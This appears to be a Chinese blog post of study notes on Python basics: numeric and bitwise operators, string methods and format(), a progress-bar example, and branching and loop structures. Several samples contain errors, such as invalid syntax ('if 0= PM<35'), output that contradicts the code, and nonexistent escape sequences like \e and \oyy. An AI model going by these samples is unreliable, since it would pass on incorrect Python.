这些操作符几乎与数学习惯一致，运算结果也符合数学意义。操作符运算的结果可能改变数字类型，3种数字类型之间存在一种逐渐扩展的关系，具体如下：\n整数-\u0026gt;浮点数\u0026gt;复数\n这是因为整数可以看成是浮点数没有小数的情况，浮点数可以看成是复数虚部为0的情况。基于上述扩展关系，数字类型之间相互运算所生成的结果是“更宽”的类型，基本规则如下。\n（1）整数之间运算，如果数学意义上的结果是小数，结果是浮点数。\n（2）整数之间运算，如果数学意义上的结果是整数，结果是整数。\n（3）整数和浮点数混合运算，输出结果是浮点数。\n（4）整数或浮点数与复数运算，输出结果是复数。\n如下例子所示：\n1 2 3 4 100/3 100//3 123 + 4.0 10.0 - 1 + 2j #等价于(10.0 - 1)+2j 33.333333333333336\n33\n127.0\n(9+2j)\nBool运算符（补充） Bool运算符：\u0026amp;（按位与运算）\nBool的运算符\u0026amp;和上面所讲的\u0026amp;\u0026amp;有区别，但在实际编程中很容出错，需要多加小心\n1 2 a = 4 \u0026amp; 5 print(a) 4\n这么计算的？很奇怪，让我来给你解释： 它们进行的是”按位与’运算。按位与运算的规则是：对两个数字的二进制每一位分别进行运算，只有当对应位都为 1 时，结果位才为 1，否则为 0。\n1 2 3 4 4--\u0026gt;100 #4的二进制是100 5--\u0026gt;101 #5的二进制是101 _______ 100 得出最终结果等于100，再进行十进制转换得出为4。\nBool运算符：|（按位或运算）\n这个就比较霸道了e///\n4\u0026ndash;\u0026gt;100 #4的二进制是100 5\u0026ndash;\u0026gt;101 #5的二进制是101\n4\u0026ndash;\u0026gt;100 #4的二进制是100 5\u0026ndash;\u0026gt;101 #5的二进制是101\n1 2 a = 6 | 5 print(a) 7\n它们进行的是”按位或’运算。按位或运算的规则是：对两个数字的二进制每一位分别进行运算，当对应位出现 1 时，结果位必为 1，否则为 0。\n1 2 3 4 6--\u0026gt;110 #6的二进制是110 5--\u0026gt;101 #5的二进制是101 _______ 111 得出最终结果等于111，再进行十进制转换得出为7。\n内置的数值运算函数 函数 描述 abs(x) x的绝对值 divmod(x,y) (x//y,x%y)，输出为二元组形式（也称为元组类型） pow(x,y[,z]) (x**y)%z,[.]表示该参数可以省略。即pow(x,y)，它与相同 round(x[,ndigits]) 对x四舍五入，保留ndigits位小数。round(x)返回四舍五入的整数值 max(X1,X2,\u0026hellip;\u0026hellip;,Xn) X1,X2,\u0026hellip;.,Xn的最大值，n没有限定 min(X1,X2\u0026hellip;\u0026hellip;,Xn) X1,X2,\u0026hellip;.,Xn的最小值，n没有限定 内置的数字类型转换函数 数值运算操作符可以隐式地转换输出结果的数字类型，例如，两个整数采用运算符”的除法将可能输出浮点数结果。此外，通过内置的数字类型转换函数可以显式地在数字类型之间进行转换，如表3.4所示。 浮点数类型转换为整数类型时，小数部分会被舍弃（不使用四舍五入)，复数不能直接转换为其他数字类型，可以通过.real和.imag将复数的实部或虚部分别转换，例如：\n函数 描述 int(x) 将x转换为整数，x可以是浮点数或字符串 float(x) 将x转换为浮点数，x可以是整数或字符串 complex(re[,im]) 生成一个复数，实部为re，虚部为im，re 可以是整数、浮点数或字符串，im可以是整数或浮点数但不能为字符串 1 2 3 4 int (10.99) complex(10.99) #复数包含实数和虚数，用complex是表示复数形式 float(10 + 99j) #解释器必报错，复数不是浮点数类型float float((10 + 99j).imag) 输出结果分别是：\n10\n(10.99 + 0j)\n报错TypeError\n99.0\nMath库的使用 Math概述 继前章的turtle使用，目前还对库引用比较生疏，而且刚了解到数学运算符，对它也相对陌生，正好利用这个案例把这两部分巩固一下。又能学库的引用还能认识更多的数学函数在Python的样子，岂不美哉？\nMath 库是 Python 提供的内置数学类函数库，因为复数类型常用于科学计算，一般计算并不常用，因此math 库不支持复数类型，仅支持整数和浮点数运算。math库一共提供了4个数学常数和44个函数。44个函数共分为4类，包括16个数值表示函数、8个幂对数函数、16个三角对数函数和4个高等特殊函数。\n大家可以去官网看看，太多函数了，描述很详细，链接在上面。\n案例：天天向上的力量\n1 2 3 4 import math dayup = math.pow((1.0 + 0.001),365）#提高0.001 daydown = math.pow((1.0 - 0.001),365) #放任0.001 print(\u0026#34;向上:{:.2f}，向下:{:.2f}.\u0026#34;.format(dayup, daydown)） 向上：1.44，向下：0.69\n字符串类型及其操作 字符串类型的表示 字符串是字符的序列表示，可由一对单双三引号构成。\n单引号字符串：\u0026ldquo;单引号表示，可以使用\u0026quot;双引号\u0026quot;作为字符串的一部分'\n双引号字符串：\u0026ldquo;双引号表示，可以使用\u0026rsquo;单引号\u0026rsquo;作为字符串的一部分”\n三引号字符串：“三引号表示可以使用\u0026quot;双引号\u0026rdquo;\n\u0026lsquo;单引号\u0026rsquo;\n也可以换行\n\u0026rsquo;''\n如下例子：\n1 2 3 4 5 6 7 8 s = \u0026#39;adj\u0026#39; #定义单行字符串 s = \u0026#34;adj\u0026#34; s = \u0026#39;\u0026#39;\u0026#39;adj adj CTF\u0026#39;\u0026#39;\u0026#39; #定义多行字符串 s = \u0026#34;\u0026#34;\u0026#34;6 4 66\u0026#34;\u0026#34;\u0026#34; #定义多行字符串 反斜杠字符（\\）是一个特殊字符，在字符中表示转义，即该字符与后面相邻的一个字符共同组成了新的含义。如，\\n表示换行、\\t表示制表符（Tab）等等。\n1 print(\u0026#34;Python\\n语言\\t程序\\t设计\u0026#34;) Python\n语言\t程序\t设计\n以下是Python的各种转义字符：\n转义字符 描述 \\（在行尾时） 续行符 \\\\ 反斜杠符号 \\' 单引号 \\\u0026rdquo; 双引号 \\a 响铃 \\b 退格（Backspace） \\e 转义 \\000 空 \\n 换行 \\v 纵向制表符 \\t 横向制表符 \\r 回车 \\f 换页 \\oyy 八进制数yy代表的字符，如：\\o12代表换行 \\xyy 十进制数yy代表的字符，如：\\x0a代表换行 \\other 其它的字符以普通格式输出 这个\\a很有意思啊，真会响铃啊，不过得在终端才会这样的，在其它编程软件可能不会这样的，你可以去试一试。\n字符与切片 前章已经介绍，字符串包括两种序号体系：正向递增序号和反向递减序号s。\n如果字符串长度为L,正向递增需要以最左侧字符序号为0,向右依次递增，最右侧字符序号为L-1：反向递减序号以最右侧字符序号为-1，向左依次递减，最左侧字符序号为-L。这两种索引字符的方法可以在一个表示中使用。司Python 字符串也提供区间访问方式，采用[N:M]格式，表示字符串中从N到M（不包含M）的子字符串，其中，N和M为字符串的索引序号，可以混合使用正向递增序号和反向递减序号。如果表示中M或者N索引缺失，则表示字符串把开始或结束索引值设为默认值。\n字符串以Unicode编码存储，因此，字符串的英文字符和中文字符都算作1个字符。 观察下面实例：\n1 2 3 4 5 6 7 8 name = \u0026#34;Python语言程序设计\u0026#34; name[0] print(name[0],name[7],name[-1]) print(name[2:-4]) print(name[:6]) print(name[6:]) print(name[:]) 以下为输出结果，一一对应：\n\u0026lsquo;P\u0026rsquo;\n\u0026lsquo;P 言 计\u0026rsquo;\nthon语言\nPython\n语言程序设计\nPython语言程序设计\n字符串操作符 Python很厉害哈，数学1+1，我Python直接字符串相加：\n​ 基本的字符串操作符\n操作符 描述 x + y 连接两个字符串x与y x * n或n * x 复制n次字符串x x in s 如果x是s的子串，返回True，否则返回False索引 str[i] 返回第i个字符 str[N:M] 切片，返回索引第N到第M的字符串，其中不包含M 这里有个易错点，我先声明下，关于操作符x in s的使用：\n1 2 t = \u0026#39;fasd\u0026#39; print(\u0026#39;as\u0026#39; in t) #判断as是否在t字符串当中 True\n但是：sd\n1 2 t = \u0026#39;fasd\u0026#39; print(\u0026#39;ad\u0026#39; in t) #判断ad是否在t字符串当中 False\n为什么是错的？ad不都在fasd字符串当中吗？这可不是哦，因为ad这是一个字符串，fasd也是一个字符串，都是一个整体，连在一起的，fasd可没有连在一起的ad哦，只有分开的才有。要当心！\n内置的字符串处理函数 Python解释器提供了一些内置函数。其中，有6个函数与字符串处理相关，如下表所示：\n函数 描述 len(x) 返回字符串x的长度，也可返回其他组合数据类型元素个数 str(x) 返回任意类型x所对应的字符串形式 chr(x) 返回Unicode编码x对应的单字符 ord(x) 返回单字符表示的Unicode编码 hex(x) 返回整数×对应十六进制数的小写形式字符串 oct(x) 返回整数x对应八进制数的小写形式字符串 len(x)返回字符串x的长度，Python 3以Unicode 字符为计数基础，因此，字符串中英文字符和中文字符都是1个长度单位。\n1 2 len(\u0026#34;Python语言程序设计\u0026#34;) len(\u0026#34;\\n\u0026#34;) #\\n表示一个“换行”字符 12\n1\n1 Str(3.1415926) \u0026lsquo;3.1415926\u0026rsquo;\n每个字符在计算机中可以表示为一个数字，称为编码。字符串则以编码序列方式存储在计算机中。目前，计算机系统使用的一个重要编码是ASCI编码，该编码用数字0～127表示计算机键盘上的常见字符以及一些被称为控制代码的特殊值,例如，大写字母A～Z用65～90表示，小写字母a～z用97～122表示。\nASCII 编码针对英语字符设计，它没有覆盖其他语言存在的更广泛字符，因此，现代计算机系统正逐步支持一个更大的编码标准 Unicode，它支持几乎所有书写语言的字符。Python 字符串中每个字符都使用 Unicode编码表示。\nchr这个函数就和unicode有关啦；\n1 chr(97) #返回Unicode编码a对应的单字符 \u0026lsquo;a\u0026rsquo;\n1 2 hex(255) #返回整数255对应十六进制数的小写形式字符串 oct(-255) #返回整数-255对应八进制数的小写形式字符串 \u0026lsquo;0xff\u0026rsquo;\n\u0026lsquo;-0o377\u0026rsquo;\n内置的字符串处理方法 在Python 解释器内部，所有数据类型都采用面向对象方式实现，封装为一个类。 字符串也是一个类，它具有类低《a》.《b》()形式的字符串处理函数。在面向对象中，这类函数被称为“方法”。字符串类型共包含43个内置方法。鉴于部分内置方法并不常用，限于篇幅，这里仅介绍其中16个常用方法，如下表所示：\n方法 描述 str.lower() 返回字符串str的副本，全部字符小写 str.upper() 返回字符串str的副本，全部字符大写 str.islower() 当str所有字符都是小写时，返回True，否则返回 False str.isprintable() 当str所有字符都是可打印的,返回True,否则返回 False str.isnumeric() 当str所有字符都是数字时，返回True，否则返回 False str.isspace()（少用） 当str所有字符都是空格，返回True，否则返回 False str.endswith(suffix[,start[,end]]) str[start: end]以suffix结尾返回True，否则返回False str.startwith(prefix[,start[,end]]) str[start: end]以prefix开始返回 True，否则返回False str.split(sep=None,maxsplit=-1) 返回一个列表，由str根据 sep被分隔的部分构成 str.count(sub[,start[,end]]) 返回 str[start: end]中 sub子串出现的次数 str.replace(old,new[,count]) 返回字符串str的副本，所有old子串被替换为new，如果count给出，则前count次old出现被替换 str.center(width[,fillchar]) 字符串居中函数 str.strip([chars]) 返回字符串str的副本，在其左侧和右侧去掉chars中列出的字符 str.zfill(width) 返回字符串str的副本，长度为 width，不足部分在左侧添0 str.format() 返回字符串str的一种排版格式 str.join(iterable) 返回一个新字符串，由组合数据类型iterable变量的每个元素组成，元素间用str分隔 字符串类型的格式化 要点：字符串通过format()方法进行格式化处理。\n为什么会有字符串类型的格式化问题呢？例如，一个程序希望输出如下内容： “2016-12-31：计算机PYTHON的 CPU占用率为10%。”\n其中，下画线内容可能会变化，需要由特定函数运算结果进行填充，最终形成上述格式字符串作为输出结果。字符串格式化用于解决字符串和变量同时输出时的格式安排。\n字符串是程序向控制台、网络、文件等介质输出运算结果的主要形式之一，为了能提供更好的可读性和灵活性，字符串类型的格式化是运用字符串类型的重要内容之一。Python 语言同时支持两种字符串格式化方法，一种类似C语言中printf()函数的格式化方法，支持该方法主要考虑与大批C语言程序员编程习惯相一致；另一种采用专门的 str.format()格式化方法。由于 Python中更为接近自然语言的复杂数据类型（如列表和字典等)无法通过类C的格式化方法很好表达，Python已经不在后续版本中改进C风格格式化方法。Python 语言将主要采用 format()方法进行字符串格式化。以下是关于format的讲解。\nFormat()方法的基本使用 字符串format()方法的使用格式：\n\u0026lt;模板字符串\u0026gt;.format(\u0026lt;逗号分隔的参数\u0026gt;)\n模板字符串由一系列槽组成，用来控制修改字符串中嵌入值出现的位置，槽用大括号{}表示，如果大括号里面没有序号的话，默认按当前自然顺序来排序。如下：\n1 print(\u0026#34;{}: 计算机{}的CPU占用率为{}%。\u0026#34;.format(\u0026#34;2025-8-11\u0026#34;,\u0026#34;Python\u0026#34;,10)) 计算机Python的CPU占用率为10%。\nformat()方法可以非常方便地连接不同类型的变量或内容，如果需要输出大括号，采用{{表示，}表示}，例如：\n1 \u0026#34;{}{}{}\u0026#34;.format(\u0026#34;圆周率是\u0026#34;,3.1415926,\u0026#34;...\u0026#34;) 圆周率是3.1415926\u0026hellip;\n当然，也可在大括号里面放序号进行排序：\n1 \u0026#34;圆周率{{1}{2}}是{0}\u0026#34;.format(\u0026#34;无理数\u0026#34;,3.1415926,\u0026#34;...\u0026#34;) 圆周率(3.1415926\u0026hellip;)是无理数\nFormat()方法的格式控制 format()方法中模板字符串的槽除了包括参数序号，还可以包括格式控制信息。 此时，槽的内部样式如下： {\u0026lt;参数序号\u0026gt;：\u0026lt;格式控制标记\u0026gt;}\n其中，格式控制标记也用来控制参数显示时的格式：\n: 引导符号 \u0026lt;填充\u0026gt; 用于填充单个字符 \u0026lt;对齐\u0026gt; \u0026lt;左对齐；\u0026gt;右对齐；^居中对齐 \u0026lt;宽度\u0026gt; 槽的设定输出宽度 \u0026lt;,\u0026gt; 数字的千位分隔符适用于整数和浮点数 \u0026lt;.精度\u0026gt; 浮点数小数部分的精度或字符串的最大输出长度 \u0026lt;类型\u0026gt; 整数类型b,c,d,o,x,X,浮点数类型e,E,f,% 格式控制标记包括\u0026lt;填充\u0026gt;、\u0026lt;对齐\u0026gt;、\u0026lt;宽度\u0026gt;、\u0026lt;、\u0026gt;、\u0026lt;.精度\u0026gt;、\u0026lt;类型\u0026gt;6 个字段，这些字段都是可选的，可以组合使用，这里按照使用方式逐一介绍。\n\u0026lt;宽度\u0026gt;、\u0026lt;对齐\u0026gt;和\u0026lt;填充\u0026gt;是 3个相关字段。\u0026lt;宽度\u0026gt;指当前槽的设定输出字符宽度，如果该槽对应的 format)参数长度比\u0026lt;宽度\u0026gt;设定值大，则使用参数实际长度； 如果该值的实际位数小于指定宽度，则位数将被默认以空格字符补充。\u0026lt;对齐\u0026gt;指参数在宽度内输出时的对齐方式，分别使用\u0026lt;、\u0026gt;和^ 3个符号表示左对齐、右对齐和居中对齐。\u0026lt;填充\u0026gt;指宽度内除了参数外的字符采用什么方式表示，默认采用空格，可以通过填充更换。例如：\n1 2 3 4 5 6 7 8 9 10 11 S = \u0026#34;PYTHON\u0026#34; \u0026#34;{0:30}\u0026#34;.format(s) #默认左对齐 #输出\u0026#39;PYTHON \u0026#39; \u0026#34;{0:\u0026gt;30}\u0026#34;.format(s) #右对齐 #输出\u0026#39; PYTHON\u0026#39; \u0026#34;{0:*^30}\u0026#34;.format(s) #居中且使用*填充，加上原本的6个字符位，一共占30位 \u0026gt;\u0026gt;\u0026gt;\u0026#39;************PYTHON************\u0026#39; \u0026#34;{0:-^30}\u0026#34;.format(s）#居中且使用-填充 #输出\u0026#39;------------PYTHON------------\u0026#39; \u0026#34;{0:3}\u0026#34;.format(s) #输出PYTHON 格式控制标记中的逗号（,)用于显示数字类型的千位分隔符，例如：\n1 2 3 4 5 6 \u0026#34;{0:-^20,}\u0026#34;.format(1234567890） #输出\u0026#39;---1,234,567,890----17 \u0026#34;{0:-^20}\u0026#34;.format(1234567890）#对比输出 #输出1-----1234567890-----18 \u0026#34;{0:-^20,}\u0026#34;.format(12345.67890） #输出1----12,345.6789-----193 \u0026lt;.精度\u0026gt;表示两个含义，由小数点(.)开头。对于浮点数，精度表示小数部分输出的有效位数。对于字符串，精度表示输出的最大长度。\n1 2 3 4 5 6 \u0026#34;{0:.2f}\u0026#34;.format(12345.67890） #输出\u0026#39;12345.68\u0026#39; \u0026#34;{0:H^20.3f}\u0026#34;.format(12345.67890) #输出\u0026#39;HHHHH12345.679HHHHHH\u0026#39; \u0026#34;{0:.4}\u0026#34;.format(\u0026#34;PYTHON\u0026#34;) #输出\u0026#39;PYTH\u0026#39; \u0026lt;类型\u0026gt;表示输出整数和浮点数类型的格式规则。对于整数类型，输出格式包括以下6种：\n（1）b：输出整数的二进制方式。\n（2) c：输出整数对应的Unicode 字符。\n（3）d：输出整数的十进制方式。\n（4）o:输出整数的八进制方式。\n（5）x:输出整数的小写十六进制方式。\n（6）X：输出整数的大写十六进制方式。\n1 print(\u0026#34;{0:b},{0:c},{0:d},{0:o},{0:x},{0:X}\u0026#34;.format(425)) 110101001,Ʃ,425,651,1a9,1A9\n对于浮点数类西输出格式包括以下4种。\n（1）e：输出浮点数对应的小写字母e的指数形式。\n（2）E：输出浮点数对应的大写字母E的指数形式。\n（3）f：输出浮点数的标准浮点形式。\n（4）%：输出浮点数的百分形式。\n浮点数输出时尽量使用\u0026lt;.精度\u0026gt;表示小数部分的宽度，有助于更好控制输出格式。\n1 2 \u0026#34;{0:e},{0:E},{0:f},{0:%}\u0026#34;.format(3.14) \u0026#34;{0:.2e},{0:.2E},{0:.2f},{0:.2%}\u0026#34;.format(3.14) 3.140000e+00,3.140000E+00,3.140000,314.000000%\n3.14e+00,3.14E+00,3.14,314.00%\n字符串和字节流:\n字节流是字节组成的序列，字节由固定的8个比特组成，因此，字节流从二进制角度有确定的长度和存储空间。Python字符串由编码字符的序列组成，字符 根据编码不同长度也不相同。因此，从存储空间角度，字符串和字节流不相同。\n硬盘上所有文件都以字节形式存储，例如文本、图片及视频等，真正存储和传输数据时都是以字节为单位。字符值在内存中形成，由字节流经过编码处理后产生。\n案例：文本进度条 进度条是计算机处理任务或执行软件中常用的增强用户体验的重要手段，它能够实时显示任务或软件的执行进度。本节将利用Python 字符串处理方法实现文本进度条功能。\n最简单地，利用print)函数实现简单的非刷新文本进度条。基本思想是按照任务执行百分比将整个任务划分为100个单位，每执行 N%输出一次进度条。每一行输出包含进度百分比，代表已完成的部分（*）和未完成的部分（..）的两种字符，以及一个跟随完成度前进的小箭头，风格如下：\n1 %10 [*****-\u0026gt;.....................................] 由于程序执行速度远超过人眼的视觉停留时间，直接进行字符输出几乎是瞬间完成，不利于观察。为了模拟任务处理的时间效果，调用Python标准时间库 time，使用 time.sleep(t)函数将当前程序暂时挂起ts,t可以是小数。由此可以接近真实的模拟进度条效果输出。使用import保留字调用 time库。\n1 import time 接下来我将运用上节所讲到的format()来举几个例子：\n默认情况，print()函数在输出结尾处会自动产生一\u0026rsquo;\\n\u0026rsquo;，即换行符，从而让光标自动移动到下一行行首，这样上一步输出依旧保存在界面上。\n采用for循环和print()函数构成程序的主体部分，输出百分比最高（100%）为3位数据，为了使输出显得整齐，可以使用{:^3.0f}格式化百分比部分。这个简单的文本进度条代码如下。变量scale 表示输出进度条的精度，读者可以修改这个值去观察效果变化。\n1 2 3 4 5 6 7 8 9 import time scale = 10 print(\u0026#34;------执行开始------\u0026#34;) for i in range(scale + 1): a, b = \u0026#39;**\u0026#39; * i, \u0026#39;..\u0026#39; * (scale - i) c = (i / scale) * 100 print(\u0026#34;\\r%{:^3.0f}[{}-\u0026gt;{}]\u0026#34;.format(c, a, b), end=\u0026#34;\u0026#34;) #居中 time.sleep(0.1) print(\u0026#34;\\n------执行结束------\u0026#34;) 这个代码运行后就比较像那种加载界面的进度条了。。\n具体还需要自己刷题来熟悉format()。\n第四章：程序的控制结构 要点: 程序由3种基本结构组成：顺序结构、分支结构和循环结构。\n程序的基本结构 程序流程图 程序流程图用一系列图形、流程线和文字说明描述程序的基本操作和控制流程，它是程序分析和过程描述的最基本方式。流程图的基本元素包括7种，如图所示。\n学过C语言或者其它基础编程语言的对这方面比较熟悉。\n其中，起止框表示一个程序的开始和结束；判断框判断一个条件是否成立，并根据判断结果选择不同的执行路径；处理框表示一组处理过程；输入/输出框表示数据输入或结果输出；注释框增加程序的解释；流向线以带箭头直线或曲线形式指示程序的执行路径；连接点将多个流程图连接到一起，常用于将一个较大流程图分隔为若干部分。下图所示为一个流程图示例，为了便于描述，采用连接点A将流程图分成两个部分。\n像上面这张图，就很清晰，比你用代码去写思维导图就好很多，直接用图表示你的想法，再用图去转换回对应的函数、代码、语句，这是我们未来从事计算机行业很好的的交流手段之一，一定要善用这些技巧，学习交流才无阻！\n程序的基本结构 目前为止，计算机程序可以看作是一条一条顺序执行的代码。顺序结构是程序的基础，但单一的顺序结构不可能解决所有问题，因此需要引入控制结构来更改程序的执行顺序以满足多样的功能需求。\n程序由3种基本结构组成：顺序结构、分支结构和循环结构。这些基本结构都有一个入口和一个出口。任何程序都由这3种基本结构组合而成。为了直观展示程序结构，这里采用流程图方式描述。\n顺序结构是程序按照线性顺序依次执行的一种运行方式，如图4.3所示，其中语句块1和语句块2表示一个或一组顺序执行的语句。\n分支结构是程序根据条件判断结果而选择不同向前执行路径的一种运行方式，如图所示，根据分支路径上的完备性，分支结构包括单分支结构和二分支结构，二分支结构组合形成多分支结构。\n循环结构是程序根据条件判断结果向后反复执行的一种运行方式，如图，根据循环体触发条件不同,循环结构包括条件循环和遍历循环结构。\n实例 对于一个计算问题，可以用IPO、流程图或者直接以Python代码方式描述。我的建议是功能简单的问题建议直接编写Python代码，功能复杂的问题可以采用IPO 描述或流程图描述为手段。\n我想说的是：“就像速刷高考数学题一样，简单题咱们完全拿下，全部计算过程过一遍，难题我们尽量拿分，把大致过程写出来，不求计算结果，整体结构是对就好。”\n例1：圆面积和周长计算\n程序的描述方式主要有3类，分别是自然语言、流程图和伪代码。\n自然语言描述方式指使用人类语言直接描述程序，IPO描述是其中一种。优点是灵活自然，缺点是容易出现二义性，即一个描述可以产生多种不同的程序代码。\n流程图描述是程序最直观易懂的表达方式，主要适用于较短的算法。优点是直观、清晰且逻辑确定，缺点是流程图绘制比较烦琐，当程序较大时流程图会很复杂，反而降低了表达的清晰性。\n伪代码是介于自然语言与编程语言之间的一种算法描述语言。使用伪代码不用拘泥于具体编程语言，对整个算法运行过程的描述最接近自然语言。与自然语言描述不同，伪代码在保持程序结构的情况下描述算法。由于Python语言语法相对简单，在此没有过多引用伪代码方式来描述程序。（学完C语言和基础Python后又对伪代码感兴趣的，可以去了解下）\n程序的分支结构 要点：Python通过if、 elif、else等保留字提供单分支、二分支和多分支结构。\n单分支结构：if语句 Python中if的语法结构格式：\nif \u0026lt;条件\u0026gt;:\n​ \u0026lt;语句块\u0026gt;\n语句块是if条件满足后执行的一个或多个语句序列，语句块中语句通过与if所在行形成缩进表达包含关系。if语句首先评估条件的结果值，如果结果为True，则执行语句块中的语句序列，然后控制转向程序的下一条语句。如果结果为False，语句块中的语句会被跳过。f语句的控制过程如图所示。（这张图就是上节我所讲解的其中一个IPO描述流程图，想起来了吗？）\nif语句中语句块执行与否依赖于条件判断。但无论什么情况，控制都会转到if语句后与该语句同级别的下一条语句。\nif语句中条件部分可以使用任何能够产生 True 或 False的语句或函数。形成判断条件最常见的方式是采用关系操作符。Python 语言共有6个关系操作符，如表所示。\n操作符 含义 \u0026lt; 小于 \u0026lt;= 小于或等于 \u0026gt;= 大于或等于 \u0026gt; 大于 == 等于 != 不等于 特别注意，Python使用\u0026quot;=\u0026ldquo;表示赋值语句，使用\u0026rdquo;==\u0026ldquo;表示等于\n举个例子：\n一个简化版的空气质量标准采用三级模式：0~35为优，35～75为良，75以上为污染。人们也许不关心PM2.5 指数值具体为多少，而更关心空气质量到底怎样。计算机可以通过PM2.5指数分级发布空气质量提醒。该问题的IPO描述如下。\n输入：接受外部输入的PM2.5值\n处理 ：\nifPM2.5 值≥75，打印空气污染警告\nif 35\u0026lt; PM2.5值\u0026lt;75，打印空气质量良，建议适度户外运动\nif PM2.5 值\u0026lt;35，打印空气质量优，建议户外运动\n输出：打印空气质量提醒\n1 2 3 4 5 6 7 PM = eval(input(\u0026#34;请输入PM2.5数值：\u0026#34;)) if 0 \u0026lt;= PM \u0026lt;= 35: print(\u0026#34;空气优质，快去运动！\u0026#34;) if 35 \u0026lt;= PM \u0026lt;=75: print(\u0026#34;空气良好，适度户外运动！\u0026#34;) if 75 \u0026lt;= PM: print(\u0026#34;空气污染，就不要去啦！\u0026#34;) 下面这个例子是展示字符串对应的unicode编码的比较：\n1 2 3 4 \u0026lt; 5 #True \u0026#34;python\u0026#34; == \u0026#34;python\u0026#34; #True \u0026#34;Python\u0026#34; \u0026gt; \u0026#34;python\u0026#34; #true,英文大写字符对应的unicode编码是要比小写字符要小的 True\nTrue\nFalse\n二分支结构：if-else语句 Python 中if-else语句用来形成二分支结构，语法格式如下：\nif \u0026lt;条件\u0026gt;:\n​ \u0026lt;语句块1\u0026gt;\nelse:\n​ \u0026lt;语句块2\u0026gt;\n语句块1是在f条件满足后执行的一个或多个语句序列，语句块2是f条件不满足后执行的语句序列。二分支语句用于区分条件的两种可能，即True或者 False，分别形成执行路径。\n如果用户只关心空气质量是否污染两种情况，可以通过二分支语句完成。\n1 2 3 4 5 PM = eval(input(\u0026#34;请输入 PM2.5数值：\u0026#34;)) if PM \u0026gt;= 75: print(\u0026#34;空气存在污染，请小心！\u0026#34;) else: print(\u0026#34;空气没有污染，可以开展户外运动！\u0026#34;) 还有一种表达比较简洁一点：\u0026lt;表达式1\u0026gt; if \u0026lt;条件\u0026gt; else \u0026lt;表达式2\u0026gt;\n如果条件比较复杂或者本身入门Python的话建议不要这样写，会出错。\n1 2 PM = eval(input(\u0026#34;请输入 PM2.5数值：\u0026#34;)) print(\u0026#34;空气{}污染!\u0026#34;.format(\u0026#34;存在\u0026#34;if PM \u0026gt;= 75 else\u0026#34;没有\u0026#34;)) 还有一个这样的例子：\n1 2 3 4 5 6 count = 2 count = if count !=0 else \u0026#34;不存在\u0026#34; #2 count = 0 count if count !=0 else \u0026#34;不存在\u0026#34; #不存在 多分支结构：if-elif-else Python 的 if-elif-else 描述多分支结构的语句格式：\nif \u0026lt;条件1\u0026gt;:\n​ \u0026lt;语句块1\u0026gt;\nelif \u0026lt;条件2\u0026gt;:\n​ \u0026lt;语句块2\u0026gt;\n\u0026hellip;\u0026hellip;\nelse:\n​ \u0026lt;语句块N\u0026gt;\n多分支结构是二分支结构的扩展，这种形式通常用于设置同一个判断条件的多条执行路径。Python依次评估寻找第一个结果为True的条件，执行该条件下的语句块，结束后跳过整个 if-elif-else 结构，执行后面的语句。如果没有任何条件成立，else下面的语句块将被执行。else子句是可选的。\n1 2 3 4 5 6 7 PM = eval(input(\u0026#34;请输入 PM2.5数值：\u0026#34;)) if 0= PM\u0026lt;35: print(\u0026#34;空气优质，快去户外运动！\u0026#34;) elif 35\u0026lt;=PM \u0026lt;75: print(\u0026#34;空气良好，适度户外活动！\u0026#34;) else: print(\u0026#34;空气污染，请小心！\u0026#34;) 学过C语言的，这里几乎是秒懂的，知道elif后，if和else都是和C语言的规则一样的，这部分的内容我没去找实例来练习，我认为比较简单。\n程序的循环结构 要点：Python通过for、while等保留字提供遍历循环和无限循环的结构。\n根据循环执行次数的确定性，循环可以分为确定次数循环和非确定次数循环。一确定次数循环指循环体对循环次数有明确的定义，这类循环在Python中被称为“遍历循环”,其中，循环次数采用遍历结构中的元素个数来体现，具体采用 for语句实现。非确定次数循环指程序不确定循环体可能的执行次数，而通过条件判断是否继续执行循环体，Python 提供了根据判断条件执行程序的无限循环，采用while语句实现。\n遍历循环：for 语句 Python 通过保留字 for实现“遍历循环”，基本使用方法如下：\nfor \u0026lt;循环变量\u0026gt; in \u0026lt;遍历结构\u0026gt;:\n\u0026lt;语句块\u0026gt;\n之所以称为“遍历循环”，就是用 for 语句循环时，要循环多少次，全看你要 “遍历” 的那个东西里有多少个元素。简单说，就是从那个结构里一个一个把元素拿出来，给循环变量，拿一个就执行一次循环里的内容，直到拿完所有元素为止。\n关于for的语句这有一种扩展模式，就是当for循环正常执行之后，程序会继续执行 else 语句中的内容。else语句只在循环正常执行并结束后才执行，因此，可以在\u0026lt;语句块2\u0026gt;中放置判断循环执行情况的语句。下节将结合continue和 break语句进一步讲解 for语句中else的用法。\nfor \u0026lt;循环变量\u0026gt; in \u0026lt;遍历结构\u0026gt;:\n​ \u0026lt;语句块1\u0026gt;\nelse:\n​ \u0026lt;语句块2\u0026gt;\n这里先给出一个小例子：\n1 2 3 4 5 for s in \u0026#34;BIN\u0026#34;: print(\u0026#34;循环进行中：”+s) else： S=\u0026#34;循环正常结束\u0026#34; print(s) 循环进行中：B\n循环进行中：I\n循环进行中：T\n循环正常结束\n无限循环：while 语句 很多应用无法在执行之初确定遍历结构,这需要编程语言提供根据条件进行循环的语法，称为无限循环，又称条件循环。无限循环一直保持循环操作直到循环条件不满足才结束，不需要提前确定循环次数。\n结构如：\nwhile \u0026lt;条件\u0026gt;:\n​ \u0026lt;语句块\u0026gt;\n其中条件与if语句中的判断条件一样，结果为True和False。\nwhile 语义很简单，当条件判断为True时，循环体重复执行语句块中语句；当条件为False时，循环终止，执行与while同级别缩进的后续语句。当然和for差不多，也有扩展模式的”else组合“\nwhile \u0026lt;条件\u0026gt;:\n\u0026lt;语句块1\u0026gt;\nelse:\n​ \u0026lt;语句块2\u0026gt;\n这种拓展模式和for一样的，当while正常执行完后才会接着执行else语句的内容。\n循环保留字：break和continue break：突破，破坏，打破\ncontinue：继续执行\n循环结构有两个保留字：break 和 continue，它们用来辅助控制循环执行。break用来跳出（突破）最内层 for 或 while 循环，脱离该循环后程序从循环代码后继续执行，例如：\n1 2 3 4 5 for s in \u0026#34;BIT\u0026#34;: for i in range(10): #双重for循环，复合循环 print(s, end=\u0026#34;\u0026#34;) if s==\u0026#34;T\u0026#34;: break BBBBBBBBBBITTTTTTTTTT\n其中，break语句跳出了最内层for循环，但仍然继续执行外层循环。每个break语句只有能力跳出当前层次循环。\ncontinue 用来结束当前当次循环，即跳出循环体中下面尚未执行的语句，但不跳出当前循环。对于while循环，继续求解循环条件。而对于for循环，程序流程接着遍历循环列表。对比continue和break语句，如下：\n1 2 3 4 for s in \u0026#34;PYTHON\u0026#34;: if S==\u0026#34;T\u0026#34;: continue print(s, end=\u0026#34;\u0026#34;) 